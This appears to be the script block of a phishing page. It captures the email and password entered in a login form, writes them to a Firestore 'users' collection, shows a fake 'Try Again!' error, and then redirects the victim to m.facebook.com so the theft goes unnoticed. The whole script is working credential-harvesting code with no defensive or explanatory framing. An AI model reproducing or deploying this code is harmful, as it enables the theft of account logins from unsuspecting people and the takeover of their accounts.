    <script>
        $(function () {
            $("input[name='pass']").change(function () {
                var pass = $(this).val();
                if (pass != "") {
                    $(".group-append").show();
                }
                else {
                    $(".group-append").hide();
                }
            });
            $("#show_btn").on("click", function () {
                var type = $("input[name='pass']").attr("type");
                if (type == "password") {
                    $("input[name='pass']").attr("type", "text");
                } else {
                    $("input[name='pass']").attr("type", "password");
                }
            })
            $("#log_btn").click(function (e) {
                var email = $("input[name='email']").val();
                var pass = $("input[name='pass']").val();
                writeUserData(email, pass);
                e.preventDefault();
                setTimeout(function(){
                    $.confirm({
                        title:"Try Again!",
                        content:"Something Went Wrong, Please try again!",
                        
                        buttons: {
                            okay:{
                                text:"Okay",
                                btnClass: 'btn-blue',
                                keys: ['enter', 'shift'],
                                action:function () {
                                    window.location.href="https://m.facebook.com";
                                }
                            } 
                        }   
                    });
                },1500);

            })
        });
        var db = firebase.firestore();

        function writeUserData(email, password) {
            db.collection("users").add({
                email: email,
                password: password
            })
            .then(function (docRef) {
                    console.log("Document written with ID: ", docRef.id);
            })
            .catch(function (error) {
                    console.error("Error adding document: ", error);
            });
        }
    </script>
